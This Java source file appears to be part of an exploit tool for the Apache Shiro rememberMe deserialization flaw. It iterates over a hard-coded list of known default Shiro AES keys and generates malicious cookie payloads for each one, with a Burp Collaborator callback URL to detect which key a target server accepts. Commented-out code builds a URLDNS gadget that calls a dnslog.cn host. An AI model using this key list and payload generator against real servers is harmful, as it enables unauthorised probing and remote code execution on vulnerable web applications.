package com.core;

import java.io.Serializable;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.UUID;

public class Test implements Serializable{

	    public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {

//	        URLStreamHandler handler = new URLStreamHandler() {
//	            @Override
//	            protected URLConnection openConnection(URL u) throws IOException {
//	                return null;
//	            }
//	        };
//	        HashMap hm = new HashMap();
//	        String url = "http://mpwbql.dnslog.cn";
//	        URL u = new URL(null, url, handler);
//	        Class clazz = u.getClass();
//
//	        Field field = clazz.getDeclaredField("hashCode");
//	        field.setAccessible(true);
//	        field.set(u, -1);
//	        hm.put(u, url);
	    	
	    	
//	    	byte[] a={1,2,3,4,5,6};
//	    	byte[] b=Arrays.copyOfRange(a,2,a.length);
//	    	System.out.println(Arrays.toString(b));
//	    	List<String> list=new ArrayList();
//	    	list.add("sdgfsdgsdgcca");
//	    	list.set(0, list.get(0).replaceAll("cc", "ddd"));
//	    	System.out.println(list.get(0));
	    	String[] cipherkeys={"kPH+bIxk5D2deZiIxcaaaA==","2AvVhdsgUs0FSA3SDFAdag==","3AvVhmFLUs0KTA3Kprsdag==","4AvVhmFLUs0KTA3Kprsdag==","5aaC5qKm5oqA5pyvAAAAAA==","6ZmI6I2j5Y+R5aSn5ZOlAA==",
					"bWljcm9zAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","Z3VucwAAAAAAAAAAAAAAAA==","MTIzNDU2Nzg5MGFiY2RlZg==","U3ByaW5nQmxhZGUAAAAAAA==","5AvVhmFLUs0KTA3Kprsdag==",
					"fCq+/xW488hMTCD+cmJ3aQ==","1QWLxg+NYmxraMoxAXu/Iw==","ZUdsaGJuSmxibVI2ZHc9PQ==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==",
					"a2VlcE9uR29pbmdBbmRGaQ==","WcfHGU25gNnTxTlmJMeSpw==","ZAvph3dsQs0FSL3SDFAdag==","tiVV6g3uZBGfgshesAQbjA==","cmVtZW1iZXJNZQAAAAAAAA==","ZnJlc2h6Y24xMjM0NTY3OA==",
					"RVZBTk5JR0hUTFlfV0FPVQ==","WkhBTkdYSUFPSEVJX0NBVA=="};
	    	for(String s:cipherkeys){
		    	String uuid = UUID.randomUUID().toString().replaceAll("-","");
//		    	System.out.println(uuid);
		    	String c=GeneratePayload.generate("http://cm2j3vbs13c4gi05rgrt922zuq0go5.burpcollaborator.net", s);
	//	    	syso
	//	    	URL url=new URL("http://sdfdg");
	//	    	System.out.println(url.toString());
		    	System.out.println(c);
	    	}
//	    	String header="cookie: rememberMe=1234353246tygw54hr4hrjtdyj;";
//	    	String x=regReplace(header,"rememberMe=.*;" , "rememberMe=123;");
//	    	System.out.println(x);
	    }
//	    public static String regReplace(String content,String pattern,String newString){
//   	     Pattern p = Pattern.compile(pattern);
//   	     Matcher m = p.matcher(content);
//   	     String result = m.replaceAll(newString);
//   	     return result;
//   	 }
	    

}
